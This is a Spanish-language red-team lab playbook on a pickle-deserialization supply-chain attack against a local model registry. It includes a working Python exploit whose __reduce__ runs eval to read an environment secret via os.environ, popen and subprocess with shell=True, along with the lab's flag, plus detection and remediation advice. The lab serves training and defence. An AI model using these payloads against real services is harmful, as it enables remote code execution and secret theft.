# 🔴 Lab LLM03 — Supply Chain (pickle envenenado)

> 🌐 **Interfaz web (app real e independiente):** `http://localhost:5003/`
> Cada laboratorio tiene su propia UI, su propio puerto y su propio estado.
>
> 🧭 **Antes de empezar:** sigue la [metodología LLM Red Team](../../docs/metodologia-llm-redteam.md).
> Este playbook **no va directo a la bandera**: te guía por fases con pistas.

## Escenario
`Depot` es un **registry de plugins/modelos** para un pipeline LLM. Cualquiera
puede **subir** un artefacto y **cargarlo** para "activarlo". El servidor
deserializa el artefacto con `pickle.loads()` **sin verificar firma**. La bandera
está en la variable de entorno `LAB_FLAG`; hay que **exfiltrarla**.

## MITRE ATLAS
- **AML.T0010** — ML Supply Chain Compromise
- **AML.T0050** — Command and Control (exfiltración del dato obtenido)

---

## 🧭 Paso a paso (con pistas, sin spoilers)

**Objetivo:** conseguir **ejecución de código** en el servidor a través de un
artefacto y usarla para leer su secreto.

### Fase 0 — Prepara
Abre la UI. Observa que hay subida de archivos y una acción de "cargar/activar".

### Fase 1 — Reconocimiento
Lista los artefactos y prueba a subir/descargar uno legítimo.

<details><summary>💡 Pista 1 — Endpoints del registry</summary>

- `GET /plugins` → lista artefactos.
- `POST /plugins/upload?name=algo.pkl` → sube bytes crudos.
- `POST /plugins/load {"name":"algo.pkl"}` → carga (deserializa).
- `GET /plugins/files?name=...` → lee archivos del directorio del registry.
</details>

### Fase 2 — Hipótesis
El servidor confía en el formato del artefacto. ¿Qué serializa Python y, al
deserializar, **ejecuta código**? Ahí está el RCE.

<details><summary>💡 Pista 2 — El formato peligroso</summary>

`pickle`. Al cargar (`pickle.loads`) un objeto con `__reduce__` malicioso, el
método se ejecuta **en el servidor**. Construye un objeto cuyo `__reduce__`
devuelva `(eval, ("<código>",))`.
</details>

### Fase 3 — Explotación
El `.pkl` debe ejecutar código que **lea `LAB_FLAG`** del entorno y la escriba en
un archivo del propio directorio del registry, para poder leerla después.

<details><summary>💡 Pista 3 — ¿Qué código ejecutar?</summary>

Escribe la variable de entorno a un fichero, p. ej. `open('/tmp/rt_llm03_plugins/a.txt','w').write(os.environ['LAB_FLAG'])`.
Después, `GET /plugins/files?name=a.txt` te devuelve el contenido.
</details>

### Fase 4 — Post-explotación
En un escenario real, la exfiltración sería un POST a un **C2** externo. Aquí, el
canal es el propio `GET /plugins/files`. Documenta el impacto: **RCE = compromiso
total del servidor** (no solo de la bandera).

---

## 🎯 Payloads que funcionan (varios caminos)

<details><summary>Mostrar payloads (spoiler)</summary>

Todo el ataque lo hace el exploit, pero el núcleo es un objeto con `__reduce__`
que usa un **mecanismo distinto** en cada variante (todas exfiltran igual):

```python
import pickle, requests

class Malicioso:
    def __init__(self, code): self.code = code
    def __reduce__(self): return (eval, (self.code,))

d = "/tmp/rt_llm03_plugins"
variantes = {
    "a.txt": f"open('{d}/a.txt','w').write(__import__('os').environ.get('LAB_FLAG','?')) or 1",
    "b.txt": f"open('{d}/b.txt','w').write(__import__('os').popen('printenv LAB_FLAG').read()) or 1",
    "c.txt": f"open('{d}/c.txt','w').write(__import__('subprocess').run('printenv LAB_FLAG', shell=True, capture_output=True, text=True).stdout) or 1",
}

for nombre, code in variantes.items():
    r = requests.post("http://localhost:5003/plugins/upload",
                      params={"name": nombre + ".pkl"}, data=pickle.dumps(Malicioso(code)))
    requests.post("http://localhost:5003/plugins/load", json={"name": nombre + ".pkl"})
    print(nombre, "->", requests.get("http://localhost:5003/plugins/files",
                                     params={"name": nombre}).json())
```
</details>

<details><summary>🏁 Bandera (spoiler final)</summary>

`FLAG{rt_llm03_pickle_envenenado}`
</details>

## 🤖 Automatización
```bash
python exploits/exploit.py --target http://localhost:5003
```

## 🛡️ Detección (Blue Team)
- Alertar cargas de artefactos con opcodes de `pickle` peligrosos (`REDUCE`,
  `GLOBAL`, `STACK_GLOBAL`) o tipos exóticos.
- Egress inesperado desde el host del registry.
- Integridad de artefactos: firma/hash obligatorios.

## 🧰 Remediación
- **Nunca** deserializar artefactos no confiables (usar Safetensors/formatos
  sin código, o `pickle` solo con allow-list de clases).
- **Firmar y verificar** modelos/plugins; SBOM + provenance.
- Sandbox/aislamiento del proceso de carga y mínimo privilegio.
